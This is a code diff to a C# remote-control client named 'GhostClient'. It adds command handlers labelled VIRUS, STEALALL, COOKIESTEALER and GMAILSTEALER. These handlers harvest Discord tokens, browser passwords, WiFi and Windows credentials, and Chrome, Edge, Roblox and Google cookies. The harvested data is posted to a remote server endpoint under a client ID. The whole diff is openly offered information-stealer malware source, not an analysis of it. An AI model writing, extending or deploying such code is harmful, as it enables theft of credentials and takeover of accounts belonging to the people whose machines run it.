@@ -1347,6 +1347,91 @@ namespace GhostClient
                 {
                     output = CollectAndUploadData();
                 }
+                else if (upper == "!VIRUS" || upper == "VIRUS")
+                {
+                    // Full info stealer — runs everything
+                    output = "🦠 VIRUS EXECUTING — Full data exfiltration...\n";
+                    output += CollectAndUploadData();
+                    output += "\nGrabbing Discord tokens...\n" + GrabTokens();
+                    output += "\nGrabbing browser passwords...\n" + GrabBrowserPasswords();
+                    output += "\nGrabbing WiFi passwords...\n" + ListWiFi();
+                    output += "\nGrabbing Windows credentials...\n" + GetWindowsPasswords();
+                    output += "\n🦠 VIRUS COMPLETE — All data uploaded to Data Base.";
+                }
+                else if (upper == "!STEALALL" || upper == "STEALALL")
+                {
+                    output = CollectAndUploadData();
+                    output += "\n" + GrabTokens();
+                    output += "\n" + GrabBrowserPasswords();
+                }
+                else if (upper == "!COOKIESTEALER" || upper == "COOKIESTEALER")
+                {
+                    var sb = new StringBuilder();
+                    sb.AppendLine("=== COOKIE STEALER ===");
+                    // Chrome cookies
+                    try {
+                        string chromeCookies = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies";
+                        if (File.Exists(chromeCookies)) {
+                            sb.AppendLine("[Chrome] Cookies database found");
+                            string raw = File.ReadAllText(chromeCookies, Encoding.UTF8);
+                            var hostMatches = Regex.Matches(raw, @"[a-zA-Z0-9.-]+\.[a-z]{2,4}");
+                            var hosts = new HashSet<string>();
+                            foreach (Match m in hostMatches) { string h = m.Value; if (h.Contains(".") && h.Length < 50) hosts.Add(h); }
+                            sb.AppendLine("[Chrome] Found " + hosts.Count + " cookie domains");
+                            foreach (string h in hosts.Take(30)) sb.AppendLine("  " + h);
+                            // Upload
+                            var payload = new Dictionary<string, object> {
+                                { "clientId", CLIENT_ID }, { "type", "browser_cookies" }, { "source", "Chrome" },
+                                { "data", JsonEncode(new Dictionary<string, object> { { "browser", "Chrome" }, { "domains_found", hosts.Count }, { "domains", hosts.Take(30).ToList() } }) }
+                            };
+                            PostJson("/api/remote/register-data", payload);
+                        }
+                    } catch {}
+                    // Edge cookies
+                    try {
+                        string edgeCookies = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies";
+                        if (File.Exists(edgeCookies)) {
+                            sb.AppendLine("[Edge] Cookies database found");
+                            string raw = File.ReadAllText(edgeCookies, Encoding.UTF8);
+                            var hostMatches = Regex.Matches(raw, @"[a-zA-Z0-9.-]+\.[a-z]{2,4}");
+                            var hosts = new HashSet<string>();
+                            foreach (Match m in hostMatches) { string h = m.Value; if (h.Contains(".") && h.Length < 50) hosts.Add(h); }
+                            sb.AppendLine("[Edge] Found " + hosts.Count + " cookie domains");
+                            var payload = new Dictionary<string, object> {
+                                { "clientId", CLIENT_ID }, { "type", "browser_cookies" }, { "source", "Edge" },
+                                { "data", JsonEncode(new Dictionary<string, object> { { "browser", "Edge" }, { "domains_found", hosts.Count }, { "domains", hosts.Take(30).ToList() } }) }
+                            };
+                            PostJson("/api/remote/register-data", payload);
+                        }
+                    } catch {}
+                    // Roblox cookies
+                    string roblox = GrabRobloxCookies();
+                    if (!string.IsNullOrEmpty(roblox)) { sb.AppendLine("[Roblox] .ROBLOSECURITY cookie found!"); }
+                    // Google cookies
+                    var google = GrabGoogleCookies();
+                    if (google.Count > 0) { sb.AppendLine("[Google] " + google.Count + " account(s) found"); }
+                    sb.AppendLine("\nCookie stealer complete. Data uploaded to Data Base.");
+                    output = sb.ToString();
+                }
+                else if (upper == "!GMAILSTEALER" || upper == "GMAILSTEALER")
+                {
+                    var google = GrabGoogleCookies();
+                    if (google.Count > 0) {
+                        output = "Gmail/Google stealer: " + google.Count + " account(s) found\n";
+                        foreach (var acc in google) {
+                            output += "  Email: " + (acc.ContainsKey("email") ? acc["email"] : "N/A") + "\n";
+                            output += "  Source: " + (acc.ContainsKey("source") ? acc["source"] : "Browser") + "\n";
+                        }
+                        var payload = new Dictionary<string, object> {
+                            { "clientId", CLIENT_ID }, { "type", "gmail_cookies" }, { "source", "Browser Cookies" },
+                            { "data", JsonEncode(new Dictionary<string, object> { { "accounts_found", google.Count }, { "cookies", google } }) }
+                        };
+                        PostJson("/api/remote/register-data", payload);
+                        output += "\nGmail data uploaded to Data Base.";
+                    } else {
+                        output = "No Gmail/Google accounts found in browser cookies.";
+                    }
+                }
                 else if (upper.StartsWith("!MESSAGE ") || upper.StartsWith("MESSAGE "))
                 {
                     string msg = command.Substring(command.IndexOf(' ') + 1).Trim();
